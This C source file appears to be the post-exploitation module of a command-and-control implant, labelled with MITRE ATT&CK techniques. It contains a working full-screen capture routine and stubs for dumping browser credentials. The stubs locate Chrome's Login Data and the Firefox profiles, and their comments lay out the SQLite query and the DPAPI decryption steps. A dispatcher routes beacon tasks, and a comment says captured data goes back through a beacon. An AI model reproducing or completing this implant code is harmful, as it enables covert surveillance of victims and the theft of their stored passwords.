// src/postex.c
// Mod 154: GDI screenshot (T1113) | Mod 171: Browser credential stubs (T1555.003)
#include <windows.h>
#include <stdio.h>

// -- T1113: GDI screenshot capture ------------------------------------
// Captures the entire screen to a BMP blob in memory
// Returns HeapAlloc'd buffer — caller must HeapFree
BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize) {
    *ppBmpData = NULL;
    *pdwBmpSize = 0;

    // Get screen DC
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        printf("[!] screenshot: GetDC failed\n");
        return FALSE;
    }

    int width  = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);

    // BitBlt screen into our bitmap
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Get bitmap info
    BITMAP bmp = {0};
    GetObject(hBmp, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER biHeader = {0};
    biHeader.biSize        = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth       = width;
    biHeader.biHeight      = height;
    biHeader.biPlanes      = 1;
    biHeader.biBitCount    = (WORD)(bmp.bmBitsPixel);
    biHeader.biCompression = BI_RGB;

    DWORD dwBmpDataSize = ((width * biHeader.biBitCount + 31) / 32) * 4 * height;

    // Allocate buffer for BMP file
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) +
                       sizeof(BITMAPINFOHEADER) + dwBmpDataSize;
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuf) {
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    // Fill BMP file header
    BITMAPFILEHEADER bfHeader = {0};
    bfHeader.bfType    = 0x4D42; // "BM"
    bfHeader.bfSize    = dwFileSize;
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    memcpy(pBuf, &bfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(pBuf + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));

    // Get the actual pixel data
    GetDIBits(hdcMem, hBmp, 0, height,
              pBuf + bfHeader.bfOffBits,
              (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);

    *ppBmpData  = pBuf;
    *pdwBmpSize = dwFileSize;

    // Cleanup GDI
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    printf("[+] screenshot: Captured %dx%d (%ld bytes)\n",
           width, height, dwFileSize);
    return TRUE;
}

// -- T1555.003: Browser credential dump stubs -------------------------
// These are stubs — full implementation requires SQLite + DPAPI decrypt
// In a real engagement these would:
//   1. Copy Chrome/Firefox/Edge SQLite DB from AppData
//   2. Open it, SELECT origin_url, username, password_value
//   3. Decrypt password_value via CryptUnprotectData (DPAPI)

BOOL postex_dump_chrome_creds() {
    // Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
    CHAR path[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        path, MAX_PATH);

    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        printf("[*] chrome_creds: Login Data not found at %s\n", path);
        return FALSE;
    }

    printf("[+] chrome_creds: Found Login Data at %s\n", path);
    printf("[*] chrome_creds: STUB — SQLite + DPAPI decrypt not implemented\n");
    // TODO: Copy file, open SQLite, decrypt with DPAPI
    return TRUE;
}

BOOL postex_dump_firefox_creds() {
    // Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*\logins.json
    CHAR path[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(
        "%APPDATA%\\Mozilla\\Firefox\\Profiles",
        path, MAX_PATH);

    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        printf("[*] firefox_creds: Profiles not found at %s\n", path);
        return FALSE;
    }

    printf("[+] firefox_creds: Found Profiles at %s\n", path);
    printf("[*] firefox_creds: STUB — NSS decrypt not implemented\n");
    return TRUE;
}

// -- Task dispatch entry point for post-exploitation ------------------
BOOL postex_run(LPCSTR taskName) {
    if (strcmp(taskName, "screenshot") == 0) {
        PBYTE data = NULL;
        DWORD size = 0;
        return postex_screenshot(&data, &size);
        // In production: send data back via beacon_post
    }
    else if (strcmp(taskName, "dump_chrome") == 0) {
        return postex_dump_chrome_creds();
    }
    else if (strcmp(taskName, "dump_firefox") == 0) {
        return postex_dump_firefox_creds();
    }

    printf("[!] postex_run: Unknown task '%s'\n", taskName);
    return FALSE;
}
